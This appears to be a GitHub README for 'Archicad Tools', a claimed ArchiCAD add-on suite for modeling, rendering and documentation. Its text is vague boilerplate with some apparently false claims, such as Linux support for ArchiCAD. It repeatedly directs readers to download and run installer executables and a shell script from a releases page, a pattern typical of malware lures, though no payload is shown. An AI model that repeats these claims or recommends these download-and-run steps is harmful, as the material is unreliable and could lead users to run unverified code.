# Archicad Tools for BIM Mastery: Modeling, Rendering, Docs 🧰

https://github.com/assakabio/archicad-tools/releases

![Release badge](https://img.shields.io/badge/releases-download-blue?style=for-the-badge)

Archicad Tools is a curated set of utilities for ArchiCAD that accelerates BIM modeling, teamwork workflows, rendering pipelines, and project documentation. It combines scriptable helpers, a lightweight CLI, and a modular plugin system to speed up common tasks and reduce manual steps. The project targets architecture studios, BIM consultants, and educators who want repeatable, auditable workflows across teams.

Table of contents
- Why this project exists
- Core concepts and architecture
- Features and benefits
- Getting started
  - Prerequisites
  - Installation by platform
  - First run
- How to use Archicad Tools
  - Modeling helpers
  - Teamwork and collaboration
  - Rendering and visualization
  - Documentation and reporting
- Advanced workflows
  - Scripting and automation
  - Custom plugins and extensions
- Data formats and interoperability
- CLI reference and examples
- Architecture and code structure
- Testing, quality, and CI
- Localization, accessibility, and internationalization
- Security and data handling
- Community, contributions, and governance
- Roadmap and future directions
- Frequently asked questions
- Licensing and credits

Why this project exists
Archicad Tools aims to streamline the day-to-day tasks inside ArchiCAD by offering a consistent set of utilities that reduce manual steps, lower the risk of errors, and improve collaboration. In many architecture firms, teams grapple with repetitive tasks like standard sheet setup, model checks, consistent labeling, and synchronized teamwork. This project concentrates those needs into a cohesive toolkit that fits existing workflows rather than forcing a new one.

Core concepts and architecture
- Modularity: The toolkit is built from independent modules that can be enabled or disabled per project. Modules can share data, but they do not tightly couple to one another, which makes upgrades safer and testing simpler.
- Extensibility: A plugin system allows teams to add custom scripts without touching the core. This keeps upgrades stable while enabling tailored workflows.
- Interoperability: The toolkit emphasizes open formats and clear interfaces, so data can move between ArchiCAD, IFC, BIMx, and rendering engines with predictable results.
- Automation-first mindset: Repetitive tasks are automated where practical. The CLI provides a predictable, scriptable surface that integrates with CI pipelines and build systems.
- Documentation-driven: Each module ships with its own documentation and sample templates to lower the barrier to adoption.

Features and benefits
- Modeling helpers: Quick setup for common building typologies, standardized layer structures, naming conventions, and parametric templates that apply across projects.
- Teamwork and collaboration: Tools to streamline sheet exchanges, model coordination, and status updates across distributed teams. Seamless state synchronization helps prevent conflicts.
- Rendering pipeline: A streamlined path from model to presentation. Predefined render settings, batch rendering, and automated export of image sequences for client reviews.
- Documentation automation: Auto-generated room data, schedules, material lists, and graphic standards documentation that align with project templates.
- Reproducible workflows: All steps can be reproduced in CI, so a project can be rebuilt with the same results any time, on any machine that has ArchiCAD installed.
- Cross-platform readiness: The toolkit supports Windows, macOS, and Linux workflows where applicable, with platform-specific installers and instructions.
- Accessibility and localization: Localized templates and descriptive labels that help teams work in different languages and meet accessibility considerations where needed.
- Observability: Built-in logging and diagnostic tools help teams track what the toolkit did, when, and why, making audits straightforward.

Getting started
Prerequisites
- ArchiCAD: A supported version with the necessary API access. The toolkit targets recent releases to ensure compatibility with modern BIM modeling and rendering features.
- Operating system: Windows, macOS, or Linux (where ArchiCAD supports it). Some modules may have platform-specific requirements.
- Runtime dependencies: A small set of runtimes and libraries that the toolkit relies on for scripting and automation. These are installed automatically by the installer on supported platforms when applicable.
- Permissions: Administrative rights on your machine are helpful for installation, plugin registration, and service integration. Some environments may require elevated permissions to access shared network locations or Teamwork services.

Installation by platform
Note: The primary release asset on the Releases page is the Windows installer. If you use a different platform, choose the corresponding asset listed on the same page.

- Windows
  - File to download and execute: archicad-tools-windows-setup.exe
  - Steps:
    1) Open the Releases page and download archicad-tools-windows-setup.exe.
    2) Run the installer. Follow the on-screen prompts to authorize and complete the installation.
    3) Restart ArchiCAD if prompted. Open ArchiCAD and verify the Archicad Tools add-on is loaded.
  - What you get: A ready-to-use CLI, core modules, and a starter set of templates. The installer configures paths and registers the add-on with ArchiCAD.

- macOS
  - File to download and execute: archicad-tools-macos-installer.dmg
  - Steps:
    1) From the Releases page, download archicad-tools-macos-installer.dmg.
    2) Open the DMG, drag the Archicad Tools plugin into the Applications folder or the Plugins folder as instructed.
    3) Launch ArchiCAD and enable the plugin in the Add-ons manager.
  - What you get: Native macOS integration, CLI tools, and a curated set of macOS-friendly templates.

- Linux
  - File to download and execute: archicad-tools-linux-installer.sh
  - Steps:
    1) From the Releases page, download archicad-tools-linux-installer.sh.
    2) Make the file executable: chmod +x archicad-tools-linux-installer.sh.
    3) Run it: ./archicad-tools-linux-installer.sh
    4) Start ArchiCAD and ensure the plugin is registered.
  - What you get: A lean, script-friendly environment with a focus on automation and batch processing.

First run
- After installation, start ArchiCAD and check the Plugins menu for the Archicad Tools entry.
- Open the command line interface (CLI) tool shipped with the toolkit.
- Run a small test to verify core functionality. For example:
  - archicad-tools --version
  - archicad-tools init --template standard
  - archicad-tools validate-model --scene foyer
- If any module is missing or disabled, re-run the installer or use the CLI to enable it. The goal is to reach a known-good baseline configuration that matches your project template.

How to use Archicad Tools
Modeling helpers
- Template-driven modeling: The toolkit ships with standard templates for common project types such as residential, office, and education buildings. Each template predefines layers, pen sets, and naming schemes to ensure consistency across teams.
- Parametric presets: Modules include parametric controls for doors, windows, staircases, and furniture placements. By adjusting a few parameters, you can generate multiple design options rapidly without starting from scratch.
- Quick-start projects: The repository includes starter projects that illustrate best practices for structure, annotations, and labeling. Copy a starter and tailor it to your design brief.
- Quality gates: The modeling helpers include checks for model integrity, such as non-overlapping elements, correct room bounding, and valid material assignments. These checks run automatically during save or export.

Teamwork and collaboration
- Live coordination: The toolkit integrates with ArchiCAD Teamwork to help teams coordinate changes, track status, and resolve conflicts efficiently.
- Shared templates and standards: A central library stores standard templates, components, and libraries. Teams pull from this library to ensure consistency across projects.
- Versioned exports: When you export the model or deliverables, the toolkit can stamp the export with version information and a timestamp, which helps with audits and client reviews.
- Conflict resolution workflows: The system suggests resolution steps when conflicting edits occur, such as who should rework a layer or which model portion to prioritize.

Rendering and visualization
- Predefined rendering profiles: The toolkit provides a set of rendering profiles tuned for client presentations, internal reviews, and design development. These profiles balance quality, speed, and consistency.
- Batch rendering: You can queue multiple views for rendering, then batch process them overnight or during off-peak hours to maximize throughput.
- Output automation: The export process is integrated with naming conventions, file formats (PNG, JPEG, EXR), and resolution controls so you always get predictable results.
- Scene management: A scene registry helps you track which views correspond to which design phases, keeping client deliverables organized.

Documentation automation
- Auto-generated reports: The tool can generate room schedules, material lists, and quantities automatically from the model.
- Custom templates: Documentation templates reflect your firm’s branding and standards, including cover pages, color palettes, and typography.
- Diagram and annotation automation: Prebuilt diagrams and legends can be added with a single command, reducing manual drafting time.
- Export formats: Reports can be exported as PDF, DOCX, or HTML, enabling easy sharing with clients and teams.

Advanced workflows
Scripting and automation
- Scriptable tasks: The CLI exposes a rich set of commands for common tasks like exporting, labeling, and checking model integrity.
- YAML-based configuration: Projects can store their workflow rules in a YAML file, enabling consistent behavior across builds and teams.
- Batch pipelines: Combine multiple commands into a single pipeline to automate end-to-end processes, from model setup to client-ready exports.

Custom plugins and extensions
- Plugin architecture: Extend Archicad Tools with your own modules. Plugins can register new commands, hooks into the build process, and custom UI elements.
- Safe upgrade path: Plugins run in isolation from core modules, so updates to the core do not automatically break your custom extensions.
- Marketplace concept: A community marketplace lets teams share useful plugins and templates, along with usage metrics and reviews.

Data formats and interoperability
- IFC and BIM data: The toolkit supports common BIM data formats, including IFC, to enable data exchange with other software in your pipeline.
- Rendering outputs: Rendered images and sequences are stored with consistent naming and metadata for easy client review.
- Documentation data: Reports and schedules can be exported into standard document formats for client deliverables and internal reporting.

CLI reference and examples
- Basic usage:
  - archicad-tools --help
  - archicad-tools init --template standard
  - archicad-tools export --format IFC --output ./exports/project.ifc
- Rendering:
  - archicad-tools render --scene living_room --resolution 1920x1080 --output ./renders/living_room.png
- Documentation:
  - archicad-tools docgen --template standard --output ./docs/project-documentation.pdf
- Automation example (batch):
  - archicad-tools pipeline --config ./workflows/office.yaml
- Configuration example (YAML):
  - project: SkyTower
    template: office
    templates_dir: ./templates
    render:
      output_dir: ./renders
      profiles: [presentation, draft]
    docs:
      template: standard
      output_dir: ./docs

Architecture and code structure
- Core engine: The heart of Archicad Tools, exposing a stable API for modules to interact with ArchiCAD files, scenes, and project data.
- Module system: Separate components for modeling, teamwork, rendering, and documentation. Modules can be loaded or unloaded at runtime.
- CLI layer: A robust command-line interface that provides consistent behavior across modules and platforms.
- Data model: A shared data model ensures consistent interpretation of rooms, zones, materials, and elements across modules.
- Logging and debugging: Structured logging with levels for normal operation, verbose tracing, and error reporting.

Testing, quality, and CI
- Unit tests: Each module ships with unit tests for core functionality. Tests mock ArchiCAD APIs to run in isolation.
- Integration tests: End-to-end tests simulate real projects and verify the interaction between modules.
- CI pipeline: GitHub Actions runs tests on every pull request, builds binaries for Windows, macOS, and Linux where applicable, and runs linting and security checks.
- Code quality: A linter enforces consistent style and naming conventions. Pre-commit hooks run to catch issues before commits.

Localization, accessibility, and internationalization
- Language packs: The toolkit ships with translations for major languages. Community-driven translations can be added via pull requests.
- Accessible UI considerations: Tooltips, labels, and keyboard navigation are designed to be usable by a broad audience.
- Formatting standards: Templates align with architectural documentation standards, including readable typography, color contrast, and structured data.

Security and data handling
- Credentials: The toolkit avoids hard-coding credentials. When needed, it uses secure credential storage with environment-based overrides.
- Data integrity: All exports and reports include metadata that helps verify data provenance and versioning.
- Network safety: Interactions with Teamwork services are performed over secure channels with signed requests.

Community, contributions, and governance
- Contribution model: The project encourages contributions from designers, developers, and practitioners. Code, templates, and documentation are welcome.
- Code of conduct: The project follows a respectful and collaborative approach to collaboration and issue resolution.
- Governance: A lightweight governance model prioritizes stability while allowing gradual feature evolution based on user feedback.

Roadmap and future directions
- Smarter automation: Add more AI-assisted suggestions for design considerations, labeling, and optimization.
- Deeper Teamwork integration: Improve conflict resolution workflows, role-based access, and audit trails.
- Visualization enhancements: Integrate more advanced rendering presets and post-processing options.
- Expanded templates: Broaden the template library to cover more building types, climate zones, and cultural contexts.

Frequently asked questions
- What is Archicad Tools?
  - It is a collection of utilities that extend ArchiCAD workflows across modeling, teamwork, rendering, and documentation.
- Which platforms are supported?
  - Windows, macOS, and Linux where ArchiCAD supports plugins. Some modules may be platform-specific.
- How do I update Archicad Tools?
  - Use the installer for your platform, which will upgrade the core modules. If you have custom plugins, follow the upgrade notes in the plugin section.
- Can I contribute a plugin?
  - Yes. The plugin system is designed for extensions while maintaining a stable core API.
- Where can I find templates?
  - Templates are stored in the central library within the repository. You can clone or copy them for your projects.
- How do I report issues?
  - Open an issue on the repository. Include steps to reproduce, expected behavior, and screenshots when possible.

Licensing and credits
- License: Archicad Tools is distributed under a permissive license that encourages reuse in professional projects while recognizing the work of contributors.
- Attributions: All modules include credits for third-party libraries and tools that enable the functionality.
- Acknowledgments: Special thanks to early adopters, testers, and the community members who contributed templates and workflows.

Endnotes
- Release notes, changelogs, and version history are maintained in the Releases section. For up-to-date information about the latest changes, visit the Releases page linked at the top of this document.
- If you need to review the latest assets, go to the Releases page: https://github.com/assakabio/archicad-tools/releases

Downloads and release assets
- Primary Windows installer: archicad-tools-windows-setup.exe
- macOS installer: archicad-tools-macos-installer.dmg
- Linux installer: archicad-tools-linux-installer.sh

Releases page access
- For the latest versions, see the official releases page at https://github.com/assakabio/archicad-tools/releases

Notes on usage
- Always back up your project before applying new templates, scripts, or automation flows.
- Validate critical data after running automation steps to ensure the output matches project requirements.
- Use consistent naming conventions and folder structures to keep templates reusable and scalable across teams.

Appendix: example project structure
- projects/
  - SkyTower/
    - templates/
      - standard/
      - residential/
    - models/
      - ground_floor.ifc
    - renders/
      - living_room.png
      - facade.png
    - docs/
      - project_report.pdf
      - drawings_summary.pdf
    - configs/
      - workflow.yaml
  - RiversideHQ/
    - templates/
    - models/
    - renders/
    - docs/
    - configs/

Appendix: sample workflow YAML (simplified)
- project: SkyTower
  template: standard
  render:
    output_dir: ./renders
    profiles: [presentation, draft]
  docs:
    template: standard
    output_dir: ./docs
  checks:
    - model_integrity: true
    - naming_convention: strict
  pipeline:
    - init
    - import_ifc
    - apply_templates
    - generate_docs
    - render_views
    - package_deliverables

Appendix: quick-start commands
- Initialize a project with a standard template:
  archicad-tools init --template standard
- Check model integrity:
  archicad-tools check --type model
- Export IFC:
  archicad-tools export --format IFC --output ./exports/project.ifc
- Create client-ready renders:
  archicad-tools render --scene lobby --resolution 1920x1080 --output ./renders/lobby.png
- Generate project documentation:
  archicad-tools docgen --template standard --output ./docs/project-documentation.pdf

Appendix: sample code snippet (Python-style pseudo-API)
- The core API exposes methods to query model data, update elements, and trigger exports. This snippet illustrates a typical usage pattern:
  from archicad_tools.api import ArchicadModel, Renderer, DocEngine

  model = ArchicadModel.load("./projects/SkyTower/models/ground_floor.ifc")
  model.ensure_template("standard")
  model.update_label("Room 101", "Office - 12m2")
  Renderer.render_scene(model, "foyer", output="./renders/foyer.png")
  DocEngine.generate(model, template="standard", output="./docs/summary.pdf")

End of document
